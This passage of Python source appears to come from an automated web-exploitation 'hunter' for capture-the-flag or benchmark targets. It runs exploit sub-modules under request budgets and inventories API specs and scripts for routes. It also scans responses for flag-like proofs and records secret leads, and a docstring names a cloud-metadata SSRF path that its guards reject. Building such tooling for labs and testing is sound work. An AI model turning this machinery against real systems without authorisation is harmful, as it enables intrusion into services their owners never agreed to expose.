        actual = max(0, self.requests - started_requests)
        reconcile = max(0, min(remaining - actual, reported - actual))
        summary = dict(summary)
        summary["requests"] = max(actual, reported)
        captured_incomplete = any(
            _baseline_response_incomplete(response)
            for response in captured if isinstance(response, dict))
        with self.lock:
            self.requests += reconcile
            self.forge_meta = summary
            if summary.get("baseline_incomplete") or captured_incomplete:
                self.baseline_incomplete = True
            for value in list(summary.get("candidates") or [])[:12]:
                entry = {"value": str(value)[:256], "path": "forge", "shape": "forge"}
                if entry not in self.candidates:
                    self.candidates.append(entry)
        if (not is_proof(proof) and not summary.get("success")
                and not summary.get("candidates")):
            self._adopt_peer_baselines(captured, "forge")
        if is_proof(proof):
            if getattr(self, "baseline_incomplete", False):
                with self.lock:
                    entry = {"value": proof, "path": "forge", "shape": "forge"}
                    if entry not in self.candidates:
                        self.candidates.append(entry)
                self.where = "forge"
                self.stopped = self.stopped or "forge payoff has an incomplete baseline"
                return True, None
            self.shape = "forge"
            self.where = "forge"
            return True, proof
        if summary.get("success"):
            self.where = "forge"
            self.stopped = self.stopped or "forge succeeded; candidate surfaced"
            return True, None
        return False, None

    def _router_phase_rank(self, phase, default=10_000):
        for row in self.router_dispatch_plan:
            if row.get("phase") == phase:
                try:
                    return int(row.get("rank"))
                except (TypeError, ValueError):
                    return default
        return default

    def _adopt_peer_baselines(self, captured, label):
        """Bank strict proof-like tokens from an unsuccessful peer as plain controls."""
        found = set()
        incomplete = False
        for response in list(captured or [])[:80]:
            if not isinstance(response, dict):
                continue
            if _forge_event is not None and hasattr(_forge_event, "response_baseline_text"):
                try:
                    evidence = _forge_event.response_baseline_text(response)
                except Exception:
                    evidence = ""
                    incomplete = True
            else:
                body = response.get("body", response.get("text", ""))
                text = (bytes(body[:1_000_000]).decode("utf-8", "replace")
                        if isinstance(body, (bytes, bytearray)) else str(body or "")[:1_000_000])
                pairs = response.get("response_header_pairs")
                if isinstance(pairs, (list, tuple)):
                    header_values = [str(item[1]) for item in pairs[:256]
                                     if isinstance(item, (list, tuple)) and len(item) == 2]
                else:
                    headers = response.get("response_headers", response.get("headers", {}))
                    header_values = ([str(value) for value in list(headers.values())[:256]]
                                     if isinstance(headers, dict) else [])
                evidence = (text + "\n" + "\n".join(header_values))[:1_000_000]
            if _baseline_response_incomplete(response, baseline_text=evidence):
                incomplete = True
            found.update(scan_for_baseline_proofs(evidence, self.host))
        if not found and not incomplete:
            return
        with self.lock:
            if incomplete:
                self.baseline_incomplete = True
            for value in found:
                self.plain.add(value)
                self.seen.setdefault(value, []).append((label, "peer-control"))

    def _run_peer(self, module, label, *, stateful=False):
        """Run one clue-gated sibling with this hunter's client, cookies and remaining budget."""
        if module is None or self.client is None or not isinstance(self.forge_target, dict):
            return False, None
        remaining = max(0, self.max_requests - self.requests)
        if remaining <= 0 or self.stop.is_set():
            return False, None
        aid = str(self.forge_target.get("answer_id") or "target")
        meta, evidence = {}, []
        with self.lock:
            preloaded = {
                path: (dict(pg["_peer_response"])
                       if isinstance(pg.get("_peer_response"), dict) else pg)
                for path, pg in self.pages.items()
                if isinstance(path, str) and "\x00" not in path and isinstance(pg, dict)
            }
            baselines = [text for pg in self.pages.values()
                         if isinstance(pg, dict) and not pg.get("payoff")
                         for text in _page_baseline_texts(pg)]
            baselines += list(self.plain)
        captured = []
        guarded = _PeerClient(self, self.client, captured)
        started_requests = self.requests

        def client_factory(url, timeout=REQUEST_TIMEOUT):
            return _PeerClient(self, _web.WebClient(url, timeout=timeout, **self._client_kwargs()), captured)

        pctx = dict(self.forge_ctx or {})
        def peer_route_allowed(path, method="GET", allowed_actions=()):
            # Stateful exemptions are accepted only by the exact
            # state-transaction peer.  ``method`` remains explicit so that
            # adapter review can establish the control/action/readback split;
            # every other sibling keeps the historical single-argument,
            # read-only behavior.
            actions = tuple(allowed_actions) if label == "state-transaction" else ()
            return self.allowed(path, False, trusted=True, allowed_actions=actions)

        pctx.update({"deadline": self.deadline, "max_requests": remaining, "client": guarded,
                     "client_factory": client_factory, "get_only": self.get_only,
                     "route_allowed": peer_route_allowed,
                     "preloaded": preloaded, "baseline_texts": baselines, "stop": self.stop,
                     "evidence": evidence, "result_sink": meta, "prompt": self.post_prompt,
                     "dispatch_plan": list(self.router_dispatch_plan),
                     "discovery_routes": dict(self._router_discovery_routes)})
        try:
            proof = module.solve(dict(self.forge_target), pctx)
        except Exception as exc:
            actual = max(0, self.requests - started_requests)
            self._adopt_peer_baselines(captured, label)
            summary = {"requests": actual, "success": False,
                       "terminal": bool(stateful and actual), "candidates": [],
                       "stopped": "exception", "error": type(exc).__name__}
            with self.lock:
                self.peer_meta[label] = summary
            if stateful and actual:
                self.where = label
                self.stopped = self.stopped or f"{label} raised after a wire attempt"
                return True, None
            return False, None
        summary = meta.get(aid) or meta.get("target") or {}
        try:
            reported = max(0, min(remaining, int(summary.get("requests") or 0)))
        except (TypeError, ValueError):
            reported = 0
        actual = max(0, self.requests - started_requests)
        reconcile = max(0, min(remaining - actual, reported - actual))
        summary = dict(summary)
        if label == "recon-router" and isinstance(summary.get("dispatch_plan"), list):
            self.router_dispatch_plan = [dict(row) for row in summary["dispatch_plan"][:16]
                                         if isinstance(row, dict)]
        summary["requests"] = max(actual, reported)

        def peer_response_incomplete(response):
            # Validated real-time readers keep application messages/events as
            # independent siblings and perform their own correlation and
            # baseline subtraction. Joining those siblings for the generic
            # carrier baseline intentionally emits an incomplete marker; that
            # marker must not demote a proof the protocol reader established.
            # Explicit transport truncation/framing/deadline faults still
            # fail closed here.
            transport = str(response.get("transport") or "")
            integrity_fault = any(bool(response.get(key))
                                  for key in _BASELINE_INTEGRITY_KEYS)
            if (is_proof(proof) and summary.get("success") and not integrity_fault
                    and transport in ("websocket", "websocket-conversation",
                                      "sse", "sse-events")):
                return False
            return _baseline_response_incomplete(response)

        captured_incomplete = any(
            peer_response_incomplete(response)
            for response in captured if isinstance(response, dict))
        with self.lock:
            self.requests += reconcile
            self.peer_meta[label] = summary
            if summary.get("baseline_incomplete") or captured_incomplete:
                self.baseline_incomplete = True
            for value in list(summary.get("baseline_proofs") or [])[:24]:
                value = str(value)
                if PROOF_SEEN.fullmatch(value):
                    self.plain.add(value)
                    self.seen.setdefault(value, []).append((label, "peer-control"))
            for value in list(summary.get("candidates") or [])[:12]:
                entry = {"value": str(value)[:256], "path": label, "shape": label}
                if entry not in self.candidates:
                    self.candidates.append(entry)
            for finding in list(summary.get("findings") or [])[:12]:
                if isinstance(finding, dict) and finding not in self.findings:
                    self.findings.append(dict(finding))
        if (not is_proof(proof) and not summary.get("success")
                and not summary.get("candidates")):
            self._adopt_peer_baselines(captured, label)
        if is_proof(proof):
            if getattr(self, "baseline_incomplete", False):
                with self.lock:
                    entry = {"value": proof, "path": label, "shape": label}
                    if entry not in self.candidates:
                        self.candidates.append(entry)
                self.where = label
                self.stopped = self.stopped or f"{label} payoff has an incomplete baseline"
                return True, None
            self.shape = label
            self.where = label
            return True, proof
        candidate_seen = bool(summary.get("candidates"))
        if summary.get("success") or candidate_seen:
            self.where = label
            self.stopped = self.stopped or f"{label} succeeded; candidate surfaced"
            return True, None
        # A read-only protocol attempt is not itself terminal: a rejected/invalid WebSocket,
        # empty SSE stream, or other failed reader must leave the older GET waves available.
        # Mutation peers remain terminal once their bounded protocol says it began. A spent
        # deadline/request budget is independently terminal because no safe later send can run.
        if stateful and summary.get("terminal"):
            self.where = label
            self.stopped = self.stopped or f"{label} completed its bounded protocol attempt"
            return True, None
        stopped = str(summary.get("stopped") or "").strip().lower()
        if stopped in ("deadline", "max_requests", "stopped"):
            self.where = label
            self.stopped = self.stopped or stopped
            return True, None
        mutation_sent = bool(summary.get("posts") or summary.get("issue_requests")
                             or summary.get("redeem_requests") or summary.get("entity_requests")
                             or summary.get("race_started"))
        if stateful and mutation_sent:
            self.where = label
            self.stopped = self.stopped or f"{label} attempted its bounded state transition"
            return True, None
        return False, None

    @staticmethod
    def _spec_scalar(value, *, path=False, header=False):
        """Return a printable scalar explicitly supplied by an API contract."""
        if isinstance(value, bool):
            text = "true" if value else "false"
        elif isinstance(value, (str, int, float)) and not isinstance(value, complex):
            if isinstance(value, float) and not math.isfinite(value):
                return None
            text = str(value)
        else:
            return None
        if (not text or len(text.encode("utf-8", "replace")) > 160
                or any(ord(char) < 0x20 or ord(char) == 0x7f for char in text)):
            return None
        if path and (text in (".", "..") or re.fullmatch(r"[A-Za-z0-9._~-]{1,100}", text) is None):
            return None
        if header and (text != text.strip() or len(text) > 100 or any(ord(char) > 0x7e for char in text)):
            return None
        return text

    @staticmethod
    def _spec_route_safe(value):
        """Reject authority confusion and embedded URLs in a contract path.

        OpenAPI normalization is not itself a scope grant. Repeated URL, HTML
        entity, and JSON slash/colon decoding closes paths such as
        ``/proxy/http%253a%252f%252f169.254.169.254/`` before a GET exists.
        """
        if not _web.safe_route_path(value, max_bytes=1024):
            return False
        layers = _web.canonical_route_layers(value, max_bytes=1024)
        return bool(layers) and not any(
            _web.route_has_destructive_action(layer) for layer in layers)

    @staticmethod
    def _spec_accepts(operation):
        """Exact advertised vendor/version media types worth negotiating.

        Parameters are retained byte-for-byte only after a small ASCII grammar
        accepts them. This permits standard forms such as
        ``application/vnd.case+json;version=2`` without admitting newline or
        arbitrary header syntax through the contract.
        """
        out = []
        for raw in list(operation.get("response_content_types") or [])[:12]:
            value = str(raw or "").strip()
            low = value.lower()
            base = low.split(";", 1)[0].strip()
            param_names = {part.split("=", 1)[0].strip()
                           for part in low.split(";")[1:] if "=" in part}
            if (len(value) <= 240 and SPEC_MEDIA_TYPE.fullmatch(value)
                    and base not in ("text/json", "text/plain")
                    and (base.endswith("+json") or "vnd." in base or "version" in param_names)
                    and value not in out):
                out.append(value)
        return out[:SPEC_GET_MAX_VARIANTS]

    def _spec_operation_rank(self, operation, index):
        """Evidence-first stable rank for a normalized GET operation.

        This changes order only, never eligibility. A proof-shaped response,
        explicit version negotiation, or prompt-named route should survive a
        large mundane contract's six-request ceiling.
        """
        route = str(operation.get("path") or "")
        fields = []
        for row in list(operation.get("response_fields") or [])[:128]:
            if isinstance(row, dict):
                fields.append(str(row.get("name") or "").lower())
            elif isinstance(row, str):
                fields.append(row.lower())
        strong = any(re.search(r"(?:^|[-_.])(?:proof|flag|evidence)(?:$|[-_.])", name)
                     for name in fields)
        params = list(operation.get("params") or [])[:128]
        versioned = any(isinstance(row, dict)
                        and SPEC_VERSION_PARAM.fullmatch(str(row.get("name") or ""))
                        for row in params)
        versioned = versioned or bool(self._spec_accepts(operation))
        prompt_routes = getattr(self, "routes", ()) or ()
        prompt_text = str(getattr(self, "post_prompt", "") or "").lower()
        prompt_named = route in prompt_routes or (route and route.lower() in prompt_text)
        hint_text = " ".join((route, str(operation.get("operation_id") or ""))).lower()
        path_hint = bool(re.search(r"(?:^|[/_.-])(?:proof|flag|evidence|objective)(?:$|[/_.-])", hint_text))
        return (-(8 * strong + 4 * prompt_named + 2 * versioned + path_hint), index)

    @staticmethod
    def _spec_axis_values(param, *, path=False, header=False):
        """Safe scalars with optional example/default/const provenance first."""
        raw_values = []
        for key in ("example", "default", "const"):
            if key in param:
                raw_values.append(param.get(key))
        raw_values.extend(list(param.get("preferred_values") or [])[:4])
        raw_values.extend(list(param.get("values") or [])[:8])
        out = []
        for raw in raw_values:
            value = _Hunter._spec_scalar(raw, path=path, header=header)
            if value is not None and value not in out:
                out.append(value)
        return out[:8]

    def _spec_get_items(self, operations):
        """Build bounded control/payoff GETs from normalized API operations.

        Only exact declared GETs are eligible. Required path/query values must
        be supplied by enum/example/default metadata. Optional query/header
        values are used only for explicit version negotiation. Cookie,
        Authorization, arbitrary-header and request-body values are never made.
        """
        items = []
        ranked = [(index, operation) for index, operation in enumerate(list(operations or [])[:64])
                  if isinstance(operation, dict)]
        ranked.sort(key=lambda pair: self._spec_operation_rank(pair[1], pair[0]))
        for op_index, operation in ranked:
            if len(items) >= SPEC_GET_MAX_REQUESTS or not isinstance(operation, dict):
                break
            if (str(operation.get("method") or "").upper() != "GET"
                    or operation.get("requestable") is False or operation.get("surface")
                    or operation.get("contract_complete") is False
                    or operation.get("has_required_body")):
                continue
            route = operation.get("path")
            if (not self._spec_route_safe(route) or operation.get("fields")):
                continue
            params = list(operation.get("params") or [])
            axes, invalid = [], False
            header_names = set()
            placeholders = set(re.findall(r"\{([A-Za-z_][A-Za-z0-9_.-]{0,79})\}", route))
            declared_paths = set()
            for param in params[:128]:
                if not isinstance(param, dict):
                    continue
                name = param.get("name")
                location = str(param.get("in") or "").lower()
                required = bool(param.get("required"))
                if not isinstance(name, str) or location not in ("path", "query", "header", "cookie"):
                    if required:
                        invalid = True
                    continue
                schema_type = str(param.get("schema_type") or param.get("container_type")
                                  or param.get("type") or "").lower()
                if ((schema_type and schema_type not in ("string", "integer", "number", "boolean"))
                        or param.get("scalar") is False):
                    invalid = True
                    continue
                if location == "header":
                    folded_name = name.casefold()
                    if folded_name in header_names:
                        invalid = True
                        continue
                    header_names.add(folded_name)
                is_version = SPEC_VERSION_PARAM.fullmatch(name) is not None
                is_credential = SPEC_CREDENTIAL_PARAM.search(name) is not None
                if is_credential:
                    invalid = invalid or required or location == "path"
                    continue
                if location == "cookie":
                    invalid = invalid or required
                    continue
                if location == "header" and name.lower() == "authorization":
                    invalid = invalid or required
                    continue
                # Query auto-fill is deliberately version-only. Arbitrary
                # required URL/destination/key/filter values are useful agent
                # metadata but are not universal safe Layer-1 requests.
                if location == "query" and not is_version:
                    invalid = invalid or required
                    continue
                use = location == "path" or required or (location in ("query", "header") and is_version)
                if not use:
                    continue
                style = str(param.get("style") or "").lower()
                supported_style = ((location == "path" and style in ("", "simple"))
                                   or (location == "query" and style in ("", "form"))
                                   or (location == "header" and style in ("", "simple")))
                # Complex/content-based parameter serialization is not a
                # universal string substitution.  Skip it instead of guessing.
                if not supported_style or param.get("content_types"):
                    invalid = True
                    continue
                if location == "header" and not is_version:
                    invalid = True
                    continue
                values = self._spec_axis_values(
                    param, path=location == "path", header=location == "header")
                if not values:
                    invalid = True
                    continue
                if location == "path":
                    declared_paths.add(name)
                axes.append((location, name, values))
            if invalid or placeholders != declared_paths:
                continue
            if any(char in route for char in "{}<>") and not placeholders:
                continue
            accepts = self._spec_accepts(operation)
            has_version = any(SPEC_VERSION_PARAM.fullmatch(name) for loc, name, _values in axes
                              if loc in ("query", "header"))
            negotiated = bool(has_version or accepts)
            response_names = {str(row.get("name") or "").lower() for row in
                              list(operation.get("response_fields") or [])[:128]
                              if isinstance(row, dict)}
            strong_response = any(re.search(
                r"(?:^|[-_.])(?:proof|flag|evidence)(?:$|[-_.])", name) for name in response_names)
            if not placeholders and not negotiated and not strong_response:
                continue
            multivalued = sum(len(values) > 1 for _loc, _name, values in axes) + (len(accepts) > 1)
            variants = min(SPEC_GET_MAX_VARIANTS,
                           max([len(values) for _loc, _name, values in axes] + [len(accepts), 1]))
            group = "specget:" + route.split("?", 1)[0]
            if (not placeholders and negotiated and len(items) < SPEC_GET_MAX_REQUESTS
                    and self.allowed(route, offered=True, trusted=False)):
                items.append((route, "plain", False, group, True))
            for variant in range(variants):
                if len(items) >= SPEC_GET_MAX_REQUESTS:
                    break
                path = route
                query = []
                headers = {}
                for location, name, values in axes:
                    # Multiple independent axes use two coherent boundary
                    # tuples (all preferred/first, then all last) rather than
                    # index-zipping unequal lists. One axis retains first/next
                    # semantics for a normal version ladder.
                    value_index = (0 if variant == 0 else
                                   (len(values) - 1 if multivalued > 1 else min(variant, len(values) - 1)))
                    value = values[value_index]
                    if location == "path":
                        path = path.replace("{" + name + "}", urllib.parse.quote(value, safe="-._~"))
                    elif location == "query":
                        query.append((name, value))
                    else:
                        headers[name] = value
                if any(char in path for char in "{}<>"):
                    continue
                if query:
                    path += ("&" if "?" in path else "?") + urllib.parse.urlencode(query)
                if accepts:
                    accept_index = (0 if variant == 0 else
                                    (len(accepts) - 1 if multivalued > 1 else min(variant, len(accepts) - 1)))
                    headers["Accept"] = accepts[accept_index]
                if not self.allowed(path, offered=True, trusted=False):
                    continue
                tag = "specget:%d:%d" % (op_index, variant)
                items.append((path, "contractget", True, group, True, headers or None, tag))
        return items[:SPEC_GET_MAX_REQUESTS]

    def _run_endpoint_inventory(self):
        """Run passive recon; return safe routes plus tightly resolved contract GETs."""
        if _endpoint_inventory is None or self.client is None or not isinstance(self.forge_target, dict):
            return []
        remaining = max(0, self.max_requests - self.requests)
        if remaining <= 0 or self.stop.is_set():
            return []
        with self.lock:
            preloaded = {
                path: (dict(pg["_peer_response"])
                       if isinstance(pg.get("_peer_response"), dict) else pg)
                for path, pg in self.pages.items()
                if isinstance(path, str) and "\x00" not in path and isinstance(pg, dict)
            }
        fetched_pages = {}
        # Discovery is not the solve: preserve one shared-budget request for a
        # route/contract it discovers. Without this reserve a low-budget exact
        # linked JS case can spend its last request on a blind Swagger fallback
        # and never ask the target-local proof route it already found.
        discovery_budget = min(ENDPOINT_DISCOVERY_MAX_REQUESTS, max(0, remaining - 1))
        captured = []
        guarded = _PeerClient(self, self.client, captured)
        started_requests = self.requests
        ictx = {"deadline": self.deadline,
                "max_requests": discovery_budget, "client": guarded,
                "preloaded": preloaded, "stop": self.stop, "prompt": self.post_prompt,
                "_page_sink": fetched_pages,
                # row 559: wave 1 already sent these; inventory charges them where it used to send them
                "prefetched": [p for p in self.prefetched_descriptors if p in preloaded]}
        try:
            result = _endpoint_inventory.discover(dict(self.forge_target), ictx)
        except Exception as exc:
            self._adopt_inventory_pages(fetched_pages)
            self._adopt_peer_baselines(captured, "endpoint-inventory")
            actual = max(0, self.requests - started_requests)
            self.endpoint_inventory = {
                "requests": actual, "routes": [], "operations": [], "secret_leads": [],
                "stopped": "exception", "error": type(exc).__name__,
            }
            return []
        if not isinstance(result, dict):
            self._adopt_inventory_pages(fetched_pages)
            self._adopt_peer_baselines(captured, "endpoint-inventory")
            return []
        self._adopt_inventory_pages(fetched_pages)
        try:
            reported = max(0, min(discovery_budget, int(result.get("requests") or 0)))
        except (TypeError, ValueError):
            reported = 0
        actual = max(0, self.requests - started_requests)
        self.requests += max(0, min(discovery_budget - actual, reported - actual))
        used = max(actual, reported)
        secret_leads = []
        for lead in list(result.get("secret_leads") or [])[:8]:
            if not isinstance(lead, dict):
                continue
            secret_leads.append({
                "kind": str(lead.get("kind") or "lead")[:80],
                "value": str(lead.get("value") or "")[:512],
                "source": str(lead.get("source") or "")[:240],
                "via": str(lead.get("via") or "")[:240],
                "auto_submit": False,
                "note": str(lead.get("note") or "never auto-submit or reuse")[:240],
                **({"truncated": True} if lead.get("truncated") or len(str(lead.get("value") or "")) > 512 else {}),
            })
        self.endpoint_inventory = {
            "requests": used, "bytes": result.get("bytes"), "stopped": result.get("stopped"),
            "scripts": list(result.get("scripts") or [])[:4],
            "source_maps": list(result.get("source_maps") or [])[:2],
            "sitemaps": list(result.get("sitemaps") or [])[:2],
            "openapi_docs": list(result.get("openapi_docs") or [])[:2],
            "descriptor_docs": list(result.get("descriptor_docs") or [])[:4],
            "descriptor_servers": list(result.get("descriptor_servers") or [])[:16],
            "websockets": list(result.get("websockets") or [])[:8],
            "params": list(result.get("params") or [])[:32],
            "route_paths": list(result.get("route_paths") or [])[:64],
            "operations": list(result.get("operations") or [])[:32],
            "security_schemes": list(result.get("security_schemes") or [])[:16],
            "secret_leads": secret_leads,
            "secret_leads_policy": str(result.get("secret_leads_policy") or
                                       "metadata only; never auto-submit or reuse")[:300],
        }
        for finding in list(result.get("findings") or [])[:24]:
            if isinstance(finding, dict):
                self.findings.append(dict(finding))
        items = self._spec_get_items(result.get("operations") or [])
        # Deduplicate by the actual wire request, not tuple equality. The bare
        # control for a negotiated operation must not race an inventory payoff
        # for the identical headerless GET.
        wire_seen = {(item[0], tuple(sorted((item[5] or {}).items())) if len(item) > 5 else ())
                     for item in items}
        for row in list(result.get("routes") or [])[:64]:
            if not isinstance(row, dict) or not row.get("requestable"):
                continue
            route = row.get("path")
            methods = {str(m).upper() for m in (row.get("methods") or [])}
            if methods and "GET" not in methods:
                continue
            if (not self._spec_route_safe(route) or _is_asset(route)
                    or not self.allowed(route, offered=True, trusted=False)):
                continue
            sources = [str(value) for value in (row.get("sources") or [])]
            # Sitemap/robots entries are public navigation and therefore plain
            # controls. Exact API/JS/source-map disclosures can be the exploit
            # route itself and become a payoff only after a successful 2xx GET.
            payoff = any(value.startswith(("openapi:", "js:", "sourcemap:")) for value in sources)
            shape = "inventory" if payoff else "plain"
            item = (route, shape, payoff, "inventory:" + route.split("?", 1)[0], True)
            wire_key = (route, ())
            if wire_key not in wire_seen:
                items.append(item)
                wire_seen.add(wire_key)
        return items[:SPEC_GET_MAX_REQUESTS + 12]

    def _adopt_inventory_pages(self, pages):
        """Mirror inventory-fetched documents/assets as non-payoff controls.

        Endpoint inventory uses the same client but intentionally returns no
        proof. Its downloaded JS/maps/specs/sitemaps are nevertheless plain
        target bytes: a token echoed later by a discovered route is not novel.
        Keep the private handoff in memory and normalize it into Hunter.pages;
        nothing is executed and no additional request is made.
        """
        if not isinstance(pages, dict):
            return
        for path, response in list(pages.items())[:ENDPOINT_DISCOVERY_MAX_REQUESTS]:
            if (not isinstance(path, str) or not isinstance(response, dict)
                    or path in self.pages or not self.allowed(path, offered=True)):
                continue
            body = response.get("body", response.get("text", b""))
            raw_headers = response.get("response_headers", response.get("headers", {}))
            headers = ({str(key): str(value) for key, value in raw_headers.items()}
                       if isinstance(raw_headers, dict) else {})
            raw_pairs = response.get("response_header_pairs")
            if isinstance(raw_pairs, (list, tuple)):
                header_pairs = [(str(item[0])[:1024], str(item[1])[:16_384])
                                for item in raw_pairs[:512]
                                if isinstance(item, (list, tuple)) and len(item) == 2]
            else:
                header_pairs = list(headers.items())[:512]
            framing_error = None
            try:
                _web._validate_stream_framing(response.get("status"), header_pairs)
            except Exception as exc:
                framing_error = str(exc)[:240]
            if _forge_event is not None and hasattr(_forge_event, "response_text_views"):
                try:
                    views = ([] if framing_error else
                             list(_forge_event.response_text_views(response, strict=False))[:256])
                except Exception:
                    views = []
            else:
                views = ([] if framing_error else
                         _legacy_response_views(response, body, header_pairs))
            views = list(dict.fromkeys(str(value)[:1_000_000] for value in views))
            text = views[0] if views else ""
            scan_views = list(views)
            header_values = [value for _name, value in header_pairs]
            baseline_only_views = []
            if framing_error:
                baseline_only_views = [bytes(body).decode("utf-8", "replace")
                                       if isinstance(body, (bytes, bytearray)) else str(body or "")]
            if _forge_event is not None and hasattr(_forge_event, "response_baseline_text"):
                try:
                    conservative = _forge_event.response_baseline_text(response)
                except Exception:
                    conservative = ""
                if conservative and conservative not in baseline_only_views:
                    baseline_only_views.append(conservative)
            evidence = "\n".join(scan_views + baseline_only_views + header_values)[:1_000_000]
            ctype = str(next((value for key, value in header_pairs
                              if key.lower() == "content-type"), "")).lower()
            peer_response = dict(response)
            if isinstance(response.get("response_headers"), dict):
                peer_response["response_headers"] = dict(response["response_headers"])
            if isinstance(response.get("headers"), dict):
                peer_response["headers"] = dict(response["headers"])
            if isinstance(response.get("response_header_pairs"), (list, tuple)):
                peer_response["response_header_pairs"] = list(response["response_header_pairs"])
            page = {
                "path": path,
                "status": response.get("status"),
                "text": text,
                "shape": "inventory-control",
                "tag": None,
                "payoff": False,
                "evidence_text": evidence,
                "headers": headers,
                "response_header_pairs": header_pairs,
                "carrier_view_count": len(scan_views),
                "ctype": ctype,
                "_peer_response": peer_response,
            }
            if framing_error:
                page["framing_error"] = framing_error
            response_incomplete = _baseline_response_incomplete(
                response, framing_error=framing_error)
            if response_incomplete:
                page["baseline_incomplete"] = True
            browser_rows, browser_leads = self._offline_browser_findings(
                path, ctype, header_pairs, scan_views)
            if browser_rows:
                page["browser_findings"] = browser_rows
            if browser_leads:
                page["browser_script_leads"] = browser_leads
            session_reports, session_rows = self._offline_session_findings(
                path, header_pairs, scan_views)
            if session_reports:
                page["session_recon"] = session_reports
            found = set()
            for view in scan_views + baseline_only_views + header_values:
                found.update(scan_for_baseline_proofs(view, self.host))
            with self.lock:
                if path in self.pages:
                    continue
                self.pages[path] = page
                if response_incomplete:
                    self.baseline_incomplete = True
                for row in browser_rows:
                    if len(self.recon_findings) >= 160:
                        break
                    if row not in self.recon_findings:
                        self.recon_findings.append(row)
                for row in session_rows:
                    if len(self.recon_findings) >= 160:
                        break
                    if row not in self.recon_findings:
                        self.recon_findings.append(row)
                for proof in found:
                    self.seen.setdefault(proof, []).append((path.split("?", 1)[0], "inventory-control"))
                    self.plain.add(proof)

    def _trusted_clue_controls(self):
        """Read exact proxy-gated feature/secondary routes as plain GET controls.

        Historically clue routes were picked up by the generic JSON-route wave.  That lost `/submit-*` and
        other benign synthetic action names to the untrusted-route guard.  An exact proxy-signalled route from
        this target's own clue document may use the narrower ``trusted`` GET policy, which still refuses fatal
        actions, unsafe encodings, queries and other origins.

        Other two-route classes keep their established dispatch order.  In particular, pre-reading every pair
        here would add a request ahead of the Day-15 SSRF fast path; Double Spent obtains its own exact 405/403
        controls after the saved prompt has identified the race class.  An SSE route is likewise left to
        ``realtime_read`` because a normal urllib body read could wait on the persistent stream.
        """
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return []
        prose = json.dumps(doc, separators=(",", ":"), default=str)[:20_000]
        local_contract = prose + "\n" + str(self.post_prompt or "")[:20_000]
        sse = bool(re.search(r"(?i)\b(?:server[- ]sent events?|event[-_ ]stream|sse)\b", prose))
        feature = self._clue_route(doc, "feature_route")
        # Do not turn an ordinary privileged read into a baseline: only the proxy class names its
        # trusted-proxy/loopback deployment explicitly and needs these denied route controls.
        proxy_contract = bool(re.search(
            r"(?i)\b(?:trusted[_ -]?(?:reverse[_ -]?)?proxy|proxy[_ -]?trust|loopback[_ -]?only)\b",
            local_contract,
        ))
        secondary = self._clue_route(doc, "secondary_route")
        wanted = tuple((key, route) for key, route in (
            ("feature_route", feature), ("secondary_route", secondary),
        ) if proxy_contract and route)
        if proxy_contract:
            # B-236 (Day 23): any other ``*_route`` the proxy-signalled clue advertises is a control too, so
            # its loopback-header GET reaches it even when its synthetic name carries a guard word.
            extra = sorted(self._clue_advertised_routes(doc) - {feature, secondary, self.clues_route})
            wanted += tuple(("advertised_route", route) for route in extra[:CLUE_EXTRA_CONTROLS])
        pages = []
        for key, route in wanted:
            if not route or (sse and key == "feature_route"):
                continue
            if not self.allowed(route, False, trusted=True):
                self.refused.append("clue-route:" + str(route)[:180])
                continue
            page = self._page(route) or self.fetch(
                route, "clue-control", False, "clue-control:" + route,
                offered=False, trusted=True,
            )
            if page is not None:
                pages.append(page)
        return pages

    def _recon_router_discovery_items(self):
        """Exact discovery controls for the recon-first dispatcher.

        The historical reader must not add four blind paths to every target:
        the fresh-process gate freezes the fast request counts for twenty-five
        observed classes.  Instead, exact route fields in the already-fetched
        clue document authorize one of two small parallel discovery sets.  An
        advertised route wins and may authorize its conventional companion;
        generic prompt words never add blind paths to an older class.  Every
        response is a plain control and is therefore included in proof novelty
        subtraction before the router can send an exploit.
        """
        doc = self._clues_doc()
        if not isinstance(doc, dict):
            return []
        routes = []

        def add(value, default=None, *, read_action=None):
            raw = value if isinstance(value, str) else default
            if not raw:
                return
            try:
                route = _web.safe_same_origin_route(
                    raw, self.url, allow_query=False, guard_query=True, max_bytes=1024)
            except Exception:
                route = None
            if not route or route in routes or route in self.pages:
                return
            layers = _web.canonical_route_layers(route, max_bytes=1024)
            if not layers:
                return
            if read_action:
                self._router_read_actions[route] = read_action
            if not self.allowed(route, False, trusted=True):
                self._router_read_actions.pop(route, None)
                self.refused.append("router-control:" + str(route)[:180])
                return
            routes.append(route)
            return route

        signal_text = json.dumps(doc, separators=(",", ":"), default=str)[:20_000]
        case_signal = any(key in doc for key in (
            "topology_route", "case_service_route", "case_directory_route", "cases_route",
        )) or bool(re.search(
            r"(?i)(?:\bssrf[_ -]?idor\b|\binternal[_ -]?case[_ -]?service\b|"
            r"\bcase[_ -]?directory\b)", signal_text))
        update_signal = any(key in doc for key in (
            "update_feed", "updates_route", "update_policy",
            "update_policy_route", "policy_route",
        )) or bool(re.search(
            r"(?i)(?:\bsigned[_ -]?manifest\b|\bartifact[_ -]?hook\b|"
            r"\brestricted[_ -]?hook\b|\bsupply[_ -]?chain\b)", signal_text))
        if case_signal:
            add(doc.get("topology_route") or doc.get("case_service_route"), "/api/topology")
            add(doc.get("case_directory_route") or doc.get("cases_route"), "/api/cases")
        if update_signal:
            add(doc.get("update_feed") or doc.get("updates_route"),
                "/api/updates", read_action="update")
            add(doc.get("update_policy") or doc.get("update_policy_route") or doc.get("policy_route"),
                "/api/update-policy", read_action="update")

        # A rotated target can advertise the same four discovery controls as
        # ordinary landing-page links while keeping /api/clues deliberately
        # class-neutral.  These names are discovery documents, not arbitrary
        # application links: fetch only the narrow topology/case/update/policy
        # spellings before any stateful peer gets a turn.  This preserves the
        # recon-first contract without moving the whole landing-page crawl (and
        # its unrelated routes) ahead of the exact executors.
        root = self._land(self.app_root)
        for linked in self.links(root) if root else ():
            try:
                path = urllib.parse.urlsplit(linked).path.lower()
                leaf = path.rstrip("/").rsplit("/", 1)[-1]
            except (TypeError, ValueError):
                continue
            key = route = None
            if "topology" in leaf:
                key, route = "topology_route", add(linked)
            elif re.fullmatch(r"(?:case|cases|case-directory)(?:[-_.][a-z0-9]+)*", leaf):
                key, route = "case_directory_route", add(linked)
            elif "update" in leaf and "policy" in leaf:
                key, route = "update_policy_route", add(linked, read_action="update")
            elif (re.search(r"(?:^|[-_.])updates?(?:$|[-_.])", leaf)
                    or ("update" in leaf and "feed" in leaf)):
                key, route = "update_feed", add(linked, read_action="update")
            if key and route:
                prior = self._router_discovery_routes.get(key, route)
                self._router_discovery_routes[key] = route if prior == route else None
